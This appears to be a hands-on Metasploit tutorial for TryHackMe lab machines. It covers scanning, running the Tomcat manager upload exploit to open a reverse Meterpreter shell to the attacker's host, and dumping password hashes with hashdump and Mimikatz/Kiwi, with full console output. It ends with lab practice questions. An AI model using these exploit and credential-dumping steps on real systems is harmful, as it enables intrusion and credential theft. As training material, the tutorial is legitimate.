# Guide-Metasploit-Practical

### **Components of Metasploit**
- Exploit: A piece of code that uses a vulnerability present on the target system.
- Vulnerability: A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information 
or allowing the attacker to execute code on the target system.
- Payload: An exploit will take advantage of a vulnerability. 

A payload in Metasploit refers to an exploit module. There are three different types of payload modules in the Metasploit Framework: 
- Singles - Singles are payloads that are self-contained and completely standalone. A Single payload can be something as simple as adding a user to the target system 
or running calc.exe.These kinds of payloads are self-contained, so they can be caught with non-metasploit handlers such as netcat.
- Stagers - Stagers setup a network connection between the attacker and victim and are designed to be small and reliable. It is difficult to always do both of 
these well so the result is multiple similar stagers. Metasploit will use the best one when it can and fall back to a less-preferred one when necessary.
- Stages - Stages are payload components that are downloaded by Stagers modules. 
The various payload stages provide advanced features with no size limits such as Meterpreter, VNC Injection, and the iPhone ‘ipwn’ Shell.

- Reference = https://www.offensive-security.com/metasploit-unleashed/payload-types/

### **Modules**

Metasploit modules are located @ 

- /usr/share/metasploit-framework/modules
- https://www.offensive-security.com/metasploit-unleashed/modules-and-locations/

- Exploit modules 
- /usr/share/metasploit-framework/modules/exploits/

- Auxiliary modules
- /usr/share/metasploit-framework/modules/auxiliary/

- Payloads, Encoders, and Nops
- /usr/share/metasploit-framework/modules/payloads/
- /usr/share/metasploit-framework/modules/encoders/
- /usr/share/metasploit-framework/modules/nops/


### **MSFConsole Commands**

- Linux basic command works within MSFConsole such as but not limited to ls to list files, ping to check active host in the the network, history , etc. 

- More MSFconsolsole commands
https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/


### **Workspace**

- Workspace in Metasploit give us the capability to keep track of our activities and scans in order. Once connected to the database, we can start organizing our different movements by using what are called ‘workspaces’. This gives us the ability to save different scans from different locations/networks/subnets. 

- To enable workspace:

```
root@kali:~# systemctl start postgresql
root@kali:~# msfdb init
Creating database user 'msf'
Enter password for new role: 
Enter it again: 
Creating databases 'msf' and 'msf_test'
Creating configuration file in /usr/share/metasploit-framework/config/database.yml
Creating initial database schema

```

- Run MSFConsole

```
─$ sudo msfconsole 
[sudo] password for arcy24: 
                                                  
                          ########                  #
                      #################            #
                   ######################         #
                  #########################      #
                ############################
               ##############################
               ###############################
              ###############################
              ##############################
                              #    ########   #
                 ##        ###        ####   ##
                                      ###   ###
                                    ####   ###
               ####          ##########   ####
               #######################   ####
                 ####################   ####
                  ##################  ####
                    ############      ##
                       ########        ###
                      #########        #####
                    ############      ######
                   ########      #########
                     #####       ########
                       ###       #########
                      ######    ############
                     #######################
                     #   #   ###  #   #   ##
                     ########################
                      ##     ##   ##     ##
                            https://metasploit.com


       =[ metasploit v6.2.26-dev                          ]
+ -- --=[ 2264 exploits - 1186 auxiliary - 404 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: You can use help to view all 
available commands
Metasploit Documentation: https://docs.metasploit.com/

msf6 >

```

- Check database status 
```
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
msf6 > 
```

- Check workspace
```
msf6 > workspace 
  tryhackme
* default
msf6 > 
```

- Workspace Usage
```
msf6 > workspace -h 
Usage:
    workspace          List workspaces
    workspace [name]   Switch workspace

OPTIONS:

    -a, --add <name>          Add a workspace.
    -d, --delete <name>       Delete a workspace.
    -D, --delete-all          Delete all workspaces.
    -h, --help                Help banner.
    -l, --list                List workspaces.
    -r, --rename <old> <new>  Rename a workspace.
    -S, --search <name>       Search for a workspace.
    -v, --list-verbose        List workspaces verbosely.
    
```

- List Workspace 

```
msf6 > workspace -l
  default
* tryhackme
msf6 > 
```

- Select Workspace 

`msf6 > workspace tryhackme`

- Scanning 
- Using nmap within msfconsole. Scan results will be saved in our current database. 

`msf6 > db_nmap -v -sn 172.16.70.0/24`

```
msf6 > hosts

Hosts
=====

address        mac                name                                  os_name  os_flavor  os_sp  purpose  info  comments
-------        ---                ----                                  -------  ---------  -----  -------  ----  --------
172.16.70.1    EC:68:81:2D:5A:11
172.16.70.19   00:50:56:9F:DC:9D
172.16.70.102  1C:4D:66:0A:B7:70
172.16.70.103  9C:B6:D0:9C:3A:4D  DESKTOP-AJ4D97S.netsectap-labs.local
172.16.70.104  F8:54:B8:8B:24:E3
172.16.70.105  2C:6D:C1:32:06:63  DESKTOP-DKDIVO6.netsectap-labs.local
172.16.70.107
172.16.70.108  84:72:07:33:CE:87  DESKTOP-Q899U4J.netsectap-labs.local
172.16.70.109  00:1A:13:C0:58:81
172.16.70.110  14:C1:4E:B3:E8:05
172.16.70.149  EC:2B:EB:56:67:C6
172.16.70.180  00:0C:29:4B:7F:C9
172.16.70.184  BC:A5:11:AF:87:52
172.16.70.185  00:90:A9:81:FC:97
172.16.70.190  BC:A5:11:A9:EF:07
172.16.70.198  E4:F0:42:01:C3:79
172.16.70.210  00:50:56:BB:7C:EB  dc01.netsectap-labs.local
172.16.70.211  00:50:56:BB:AE:19  fs01.netsectap-labs.local
172.16.70.212  00:50:56:BB:8D:12  dc02.netsectap-labs.local
172.16.70.251  B8:2A:72:DE:FC:87
172.16.70.252  A4:BA:DB:48:01:6A
172.16.70.253  00:0C:29:35:2D:DF  vcenter.netsectap-labs.local
```

- Display specfic columns

```
msf > hosts -c address,os_flavor

Hosts
=====

address         os_flavor
-------         ---------
172.16.194.134  XP
172.16.194.172  Ubuntu
```

- Searching 

```
msf > hosts -c address,os_flavor -S Linux

Hosts
=====

address         os_flavor
-------         ---------
172.16.194.172  Ubuntu

msf >
```

- Using hosts to fill RHOST information 

```
msf6 > use auxiliary/scanner/portscan/tcp 
msf6 auxiliary(scanner/portscan/tcp) > options 

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

```
- As you can see 'RHOSTS' option is blank. We can use our database hosts record to fill this field.

```
msf  auxiliary(tcp) > hosts -c address,os_flavor -S Linux -R

Hosts
=====

address         os_flavor
-------         ---------
172.16.194.172  Ubuntu

RHOSTS => 172.16.194.172

msf  auxiliary(tcp) > run

[*] 172.16.194.172:25 - TCP OPEN
[*] 172.16.194.172:23 - TCP OPEN
[*] 172.16.194.172:22 - TCP OPEN
[*] 172.16.194.172:21 - TCP OPEN
[*] 172.16.194.172:53 - TCP OPEN
[*] 172.16.194.172:80 - TCP OPEN
```

- Services
```
msf6 auxiliary(scanner/portscan/tcp) > services 
Services
========

host           port  proto  name           state  info
----           ----  -----  ----           -----  ----
172.16.70.1    22    tcp                   open
172.16.70.210  53    tcp    domain         open   Simple DNS Plus
172.16.70.210  88    tcp    kerberos-sec   open   Microsoft Windows Kerberos server time: 2022-12-03 19:32:13Z
172.16.70.210  135   tcp    msrpc          open   Microsoft Windows RPC
172.16.70.210  139   tcp    netbios-ssn    open   Microsoft Windows netbios-ssn
172.16.70.210  389   tcp    ldap           open   Microsoft Windows Active Directory LDAP Domain: netsectap-labs.local, Site: Default-First-Sit
                                                  e-Name
172.16.70.210  445   tcp    microsoft-ds   open   Windows Server 2016 Standard 14393 microsoft-ds workgroup: NETSECTAP-LABS
172.16.70.210  464   tcp    kpasswd5       open
172.16.70.210  593   tcp    ncacn_http     open   Microsoft Windows RPC over HTTP 1.0
172.16.70.210  636   tcp    tcpwrapped     open
172.16.70.210  3268  tcp    ldap           open   Microsoft Windows Active Directory LDAP Domain: netsectap-labs.local, Site: Default-First-Sit
                                                  e-Name
172.16.70.210  3269  tcp    tcpwrapped     open
172.16.70.210  3389  tcp    ms-wbt-server  open   Microsoft Terminal Services
```

- CSV Export

`msf > services -s http -c port 172.16.194.134 -o /root/msfu/http.csv'

- Creds

```
msf  auxiliary(mysql_login) > run

[*] 172.16.194.172:3306 MYSQL - Found remote MySQL version 5.0.51a
[*] 172.16.194.172:3306 MYSQL - [1/2] - Trying username:'root' with password:''
[*] 172.16.194.172:3306 - SUCCESSFUL LOGIN 'root' : ''
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


msf  auxiliary(mysql_login) > creds 

Credentials
===========

host            port  user  pass  type      active?
----            ----  ----  ----  ----      -------
172.16.194.172  3306  root        password  true

[*] Found 1 credential.
msf  auxiliary(mysql_login) >

```

- Adding Creds Post Exploitation

During post-exploitation of a host, gathering user credentials is an important activity in order to further penetrate a target network. As we gather sets of credentials, we can add them to our database with the creds -a command.

```
msf > creds -a 172.16.194.134 -p 445 -u Administrator -P 7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
[*] Time: 2012-06-20 20:31:42 UTC Credential: host=172.16.194.134 port=445 proto=tcp sname= type=password user=Administrator pass=7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e::: active=true

msf > creds

Credentials
===========

host            port  user           pass                                                                  type      active?
----            ----  ----           ----                                                                  ----      -------
172.16.194.134  445   Administrator  7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::  password  true

[*] Found 1 credential.
```

- Loot

After post exploitation

```
msf  post(hashdump) > run

[+] root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
[+] sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
[+] klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
[+] msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
[+] postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
[+] user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash
[+] service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash
[+] Unshadowed Password File: /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.hashes_264208.txt
[*] Post module execution completed



msf  post(hashdump) > loot

Loot
====

host            service  type          name                   content     info                            path
----            -------  ----          ----                   -------     ----                            ----
172.16.194.172           linux.hashes  unshadowed_passwd.pwd  text/plain  Linux Unshadowed Password File  /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.hashes_264208.txt
172.16.194.172           linux.passwd  passwd.tx              text/plain  Linux Passwd File               /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.passwd_953644.txt
172.16.194.172           linux.shadow  shadow.tx              text/plain  Linux Password Shadow File      /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.shadow_492948.txt

```
### **Searching for Exploits**

- After Nmap scans. As an exmple below, we have identified Tomcat version on port 1234

```
1234/tcp open  http    syn-ack ttl 61 Apache Tomcat/Coyote JSP engine 1.1
| http-enum: 
|   /examples/: Sample scripts
|   /manager/html/upload: Apache Tomcat (401 Unauthorized)
|   /manager/html: Apache Tomcat (401 Unauthorized)
|_  /docs/: Potentially interesting folder

````
- Search Tomcat exploit in msfconsole 

```
msf6 > search tomcat upload

Matching Modules
================

   #  Name                                                         Disclosure Date  Rank       Check  Description
   -  ----                                                         ---------------  ----       -----  -----------
   0  auxiliary/dos/http/apache_commons_fileupload_dos             2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
   1  auxiliary/admin/http/tomcat_ghostcat                         2020-02-20       normal     Yes    Apache Tomcat AJP File Read
   2  exploit/multi/http/tomcat_mgr_deploy                         2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   3  exploit/multi/http/tomcat_mgr_upload                         2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   4  exploit/multi/http/cisco_dcnm_upload_2019                    2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
   5  exploit/linux/http/cisco_hyperflex_file_upload_rce           2021-05-05       excellent  Yes    Cisco HyperFlex HX Data Platform unauthenticated file upload to RCE (CVE-2021-1499)
   6  exploit/linux/http/cpi_tararchive_upload                     2019-05-15       excellent  Yes    Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability
   7  exploit/linux/http/cisco_prime_inf_rce                       2018-10-04       excellent  Yes    Cisco Prime Infrastructure Unauthenticated Remote Code Execution
   8  exploit/multi/http/zenworks_configuration_management_upload  2015-04-07       excellent  Yes    Novell ZENworks Configuration Management Arbitrary File Upload
   9  exploit/multi/http/tomcat_jsp_upload_bypass                  2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass


Interact with a module by name or index. For example info 9, use 9 or use exploit/multi/http/tomcat_jsp_upload_bypass

msf6 > 
```

- Select module 3

```
msf6 > use 3
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp                                                                                
msf6 exploit(multi/http/tomcat_mgr_upload) > 
```

- Set required options using the set command

```
msf6 exploit(multi/http/tomcat_mgr_upload) > options                                                                                                     
                                                                                                                                                                
Module options (exploit/multi/http/tomcat_mgr_upload):                                                                                                          
                                                                                                                                                                       
   Name          Current Setting  Required  Description                                                                                                                   
   ----          ---------------  --------  -----------                                                                                                                        
   HttpPassword                   no        The password for the specified username                                                                                                 
   HttpUsername                   no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.16.70.107    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/tomcat_mgr_upload) > 
```
- Required options with user name and password attribute

```
msf6 exploit(multi/http/tomcat_mgr_upload) > set rhosts 10.10.208.216
rhosts => 10.10.208.216
msf6 exploit(multi/http/tomcat_mgr_upload) > set rport 1234
rport => 1234
```

```
msf6 exploit(multi/http/tomcat_mgr_upload) > options 

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword  bubbles          no        The password for the specified username
   HttpUsername  bob              no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        10.10.208.216    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT         1234             yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```
- Once all options are set, run exploit

```
msf6 exploit(multi/http/tomcat_mgr_upload) > exploit 

[*] Started reverse TCP handler on 10.13.6.58:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying nBssnGuGRT3tMUBO2mGB...
[*] Executing nBssnGuGRT3tMUBO2mGB...
[*] Sending stage (58829 bytes) to 10.10.208.216
[*] Undeploying nBssnGuGRT3tMUBO2mGB ...
[*] Undeployed at /manager/html/undeploy
[*] Meterpreter session 1 opened (10.13.6.58:4444 -> 10.10.208.216:34444) at 2022-12-04 19:01:06 -0500

meterpreter > 
````
- Now we have meterpreter 

### **Meterpreter Commands**

- Reference https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/

### **Background**

- The "background" command will send the current Meterpreter session to the background and return you to the ‘msf’ prompt. To get back to your Meterpreter session, just interact with it again.

```
meterpreter > background 
[*] Backgrounding session 9...

```

### **Session**

- The sessions command allows you to list, interact with, and kill spawned sessions. The sessions can be shells, Meterpreter sessions, VNC, etc.

```

> sessions 

Active sessions
===============

  Id  Name  Type                     Information                    Connection
  --  ----  ----                     -----------                    ----------
  8         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC         10.13.6.58:4444 -> 10.10.190.82:49214 (10.10.190.82)
  9         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ DARK-PC  10.13.6.58:9999 -> 10.10.190.82:49229 (10.10.190.82)

```

### **L0cal Exploit Suggester**

Where The Vulns At?
Before you can use the local exploit suggester, you must already have a session opened on your target. It is important to note that the type of session you have on your target can change the vulnerabilities that are detected. If you are using Windows, I would recommend using Meterpreter. For all other operating systems, a shell will give you better results due to the way platform exploit matching works. For instance, Python Meterpreter is treated as implementing the 'python' platform, which can miss native platform exploits currently. We hope to improve this in the future.

- MS module "post/multi/recon/local_exploit_suggester"

Reference: https://www.rapid7.com/blog/post/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/

### **Dumping Hash**

- There are multiple ways to capture hash values within Meterpreter

- post hasdump module 

```

search hashdump

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank    Check  Description
   -   ----                                                  ---------------  ----    -----  -----------
   0   post/aix/hashdump                                                      normal  No     AIX Gather Dump Password Hashes
   1   post/android/gather/hashdump                                           normal  No     Android Gather Dump Password Hashes for Android Systems
   2   post/bsd/gather/hashdump                                               normal  No     BSD Dump Password Hashes
   3   auxiliary/scanner/smb/impacket/secretsdump                             normal  No     DCOM Exec
   4   auxiliary/gather/ldap_hashdump                        2020-07-23       normal  No     LDAP Information Disclosure
   5   post/linux/gather/hashdump                                             normal  No     Linux Gather Dump Password Hashes for Linux Systems
   6   auxiliary/scanner/mssql/mssql_hashdump                                 normal  No     MSSQL Password Hashdump
   7   auxiliary/scanner/mysql/mysql_hashdump                                 normal  No     MYSQL Password Hashdump
   8   post/windows/gather/credentials/mcafee_vse_hashdump                    normal  No     McAfee Virus Scan Enterprise Password Hashes Dump
   9   auxiliary/scanner/mysql/mysql_authbypass_hashdump     2012-06-09       normal  No     MySQL Authentication Bypass Password Dump
   10  post/osx/gather/hashdump                                               normal  No     OS X Gather Mac OS X Password Hash Collector
   11  auxiliary/scanner/oracle/oracle_hashdump                               normal  No     Oracle Password Hashdump
   12  auxiliary/analyze/crack_databases                                      normal  No     Password Cracker: Databases
   13  auxiliary/scanner/postgres/postgres_hashdump                           normal  No     Postgres Password Hashdump
   14  post/solaris/gather/hashdump                                           normal  No     Solaris Gather Dump Password Hashes for Solaris Systems
   15  post/windows/gather/credentials/domain_hashdump                        normal  No     Windows Domain Controller Hashdump
   16  post/windows/gather/credentials/mssql_local_hashdump                   normal  No     Windows Gather Local SQL Server Hash Dump
   17  post/windows/gather/hashdump                                           normal  No     Windows Gather Local User Account Password Hashes (Registry)
   18  post/windows/gather/smart_hashdump                                     normal  No     Windows Gather Local and Domain Controller Account Password Hashes


Interact with a module by name or index. For example info 18, use 18 or use post/windows/gather/smart_hashdump

msf6 exploit(windows/local/bypassuac_eventvwr) > use 17
msf6 post(windows/gather/hashdump) > 

```

msf6 post(windows/gather/hashdump) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                    Connection
  --  ----  ----                     -----------                    ----------
  8         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC         10.13.6.58:4444 -> 10.10.190.82:49214 (10.10.190.82)
  9         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ DARK-PC  10.13.6.58:9999 -> 10.10.190.82:49229 (10.10.190.82)

msf6 post(windows/gather/hashdump) > set session 9
session => 9
msf6 post(windows/gather/hashdump) > options 

Module options (post/windows/gather/hashdump):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  9                yes       The session to run this module on
   
msf6 post(windows/gather/hashdump) > run

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY e8764ef63a8864b8326f31fae6b3ad34...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

Dark:"Please don't use this password ever"

[*] Dumping password hashes...

```
- Or

- Mimikatz / Kiwi

```

meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

[!] Loaded x86 Kiwi on an x64 architecture.

Success.

Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
    
meterpreter > lsa_dump_sam 
[+] Running as SYSTEM
[*] Dumping SAM
Domain : DARK-PC
SysKey : e8764ef63a8864b8326f31fae6b3ad34
Local SID : S-1-5-21-2096091615-1365079743-3039020981

SAMKey : e4050cd05f9f5141fa36ed6c2e84c44a

```

- Once hash has been identified, you can utilize any online hash decoder such as https://crackstation.net/, etc or off-line tools such as John the Ripper or Hash Cat

### **Let's Practice**

### **Blue**

- https://tryhackme.com/room/blue

- Connect to THM 

- Scan Blue host

- What is the critical vulnerability you have identified after the scan?

- Search the identified vulnerabilty in Metasploit and exploit the host

- What is the exploit module we could use for this vulnerabililty?

- Do hashdump within Meterpreter

- What is the hash of a user other than the Administrator?

- Decoding the hash value of the user and what is the password?

- What is the computer name?

### **Ice**

- https://tryhackme.com/room/ice

- Scan Ice host

- What is the host name identified in the scan?

- Identify the vulnerabilities and find exploit for Metasploit

- What is your traget port?

- What is the target volnerability

- What exploit did you find?

- What MS exploit module did you use?

- Did you get Meterpreter or shell?

- What privilege you have during the inital exploit? 

- What process did you use to identify additional vulnerability and elevate privilege?

- What is the hash of a user other than the Administrator?

- Decoding the hash value of the user and what is the password?

### **Poster**

- https://tryhackme.com/room/poster

- Scan Poster host

- What is the rdbms installed on the server?

- What port is the rdbms running on?

- What is the critical vulnerability you have identified after the scan?

- Search the identified vulnerabilty in Metasploit and exploit the host (need to use multiple modules in this exercise)

- What is the exploit module we could use for this vulnerabililty?

- Can you elevate priv using this exploit?

